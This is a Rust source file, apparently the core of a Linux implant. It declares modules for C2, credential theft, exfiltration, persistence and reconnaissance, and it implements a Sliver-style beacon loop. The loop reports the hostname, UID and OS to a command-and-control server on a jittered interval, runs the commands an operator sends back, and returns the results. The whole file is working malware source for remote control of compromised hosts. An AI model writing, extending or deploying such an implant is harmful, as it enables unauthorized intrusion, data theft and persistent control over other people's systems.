pub mod config;
pub mod c2;
pub mod copyfail;
pub mod creds;
pub mod dispatch;
pub mod exfil;
pub mod marker;
pub mod payload;
pub mod persist;
pub mod recon;

/// Continuous beacon loop — Sliver-style.
///
/// The implant stays alive and polls the C2 on the configured beacon interval.
/// Each cycle: send beacon → receive & execute commands → sleep → repeat.
///
/// If the operator sends `exit`, the loop breaks and the process exits.
/// If the operator sends `sleep <N>`, the beacon interval changes at runtime.
pub fn run_beacon_loop(config: &config::Config) {
    let implant_id = config.implant_id();
    let hostname = get_hostname();
    let mut current_interval = config.beacon_interval;
    let mut should_exit = false;

    loop {
        // Jitter before each beacon
        let jitter = config.jitter(config.beacon_jitter);
        if jitter > 0 {
            let ts = libc::timespec { tv_sec: jitter as _, tv_nsec: 0 };
            unsafe { libc::nanosleep(&ts, std::ptr::null_mut()); }
        }

        let os = config.get_os_info();
        let payload = c2::BeaconPayload {
            implant_id: implant_id.clone(),
            hostname: hostname.clone(),
            ts: unsafe { libc::time(std::ptr::null_mut()) },
            tier: config.tier_label().to_string(),
            os,
            arch: "x86_64".to_string(),
            uid: unsafe { libc::getuid() },
            protocol_version: 1,
            last_result: None,
        };

        // Send beacon and receive commands
        let response = match c2::beacon_and_poll(config, &payload) {
            Ok(r) => r,
            Err(_) => {
                // Network error — sleep and retry on next cycle
                let ts = libc::timespec { tv_sec: current_interval as _, tv_nsec: 0 };
                unsafe { libc::nanosleep(&ts, std::ptr::null_mut()); }
                continue;
            }
        };

        // Execute commands
        if !response.commands.is_empty() {
            for cmd in &response.commands {
                // Check for exit command
                if cmd.module == "system" && cmd.action == "exit" {
                    should_exit = true;
                }

                let action = dispatch::CommandAction {
                    id: cmd.id.clone(),
                    module: cmd.module.clone(),
                    action: cmd.action.clone(),
                    args: cmd.args.clone(),
                    timeout_secs: cmd.timeout_secs,
                };
                let result = action.execute(config, &implant_id);

                // Track beacon interval changes from sleep command
                if cmd.module == "system" && cmd.action == "sleep" {
                    if let Some(secs) = result.data.get("slept_secs").and_then(|v| v.as_u64()) {
                        if secs > 0 && secs < 86400 {
                            current_interval = secs;
                        }
                    }
                }

                // Send result immediately
                let payload = c2::ResultPayload {
                    implant_id: implant_id.clone(),
                    command_id: result.command_id.clone(),
                    status: result.status.clone(),
                    data: result.data.clone(),
                };
                let _ = c2::send_result(config, &payload);
            }
        }

        if should_exit {
            break;
        }

        // If stay_alive, poll faster temporarily (10s intervals, up to 5 min)
        if response.stay_alive {
            let deadline = unsafe { libc::time(std::ptr::null_mut()) } + 300;
            while unsafe { libc::time(std::ptr::null_mut()) } < deadline && !should_exit {
                let ts = libc::timespec { tv_sec: 10, tv_nsec: 0 };
                unsafe { libc::nanosleep(&ts, std::ptr::null_mut()); }

                let poll = c2::BeaconPayload {
                    implant_id: implant_id.clone(),
                    hostname: hostname.clone(),
                    ts: unsafe { libc::time(std::ptr::null_mut()) },
                    tier: config.tier_label().to_string(),
                    os: config.get_os_info(),
                    arch: "x86_64".to_string(),
                    uid: unsafe { libc::getuid() },
                    protocol_version: 1,
                    last_result: None,
                };

                let resp = match c2::beacon_and_poll(config, &poll) {
                    Ok(r) => r,
                    Err(_) => break,
                };

                if resp.commands.is_empty() {
                    continue;
                }

                for cmd in &resp.commands {
                    if cmd.module == "system" && cmd.action == "exit" {
                        should_exit = true;
                    }
                    let action = dispatch::CommandAction {
                        id: cmd.id.clone(),
                        module: cmd.module.clone(),
                        action: cmd.action.clone(),
                        args: cmd.args.clone(),
                        timeout_secs: cmd.timeout_secs,
                    };
                    let result = action.execute(config, &implant_id);
                    let _ = c2::send_result(config, &c2::ResultPayload {
                        implant_id: implant_id.clone(),
                        command_id: result.command_id.clone(),
                        status: result.status.clone(),
                        data: result.data.clone(),
                    });
                }
            }
        }

        if should_exit {
            break;
        }

        // Sleep for the beacon interval
        let ts = libc::timespec { tv_sec: current_interval as _, tv_nsec: 0 };
        unsafe { libc::nanosleep(&ts, std::ptr::null_mut()); }
    }

    // Clean exit
    unsafe { libc::exit(0); }
}

fn get_hostname() -> String {
    std::fs::read_to_string("/proc/sys/kernel/hostname")
        .unwrap_or_default()
        .trim()
        .to_string()
}
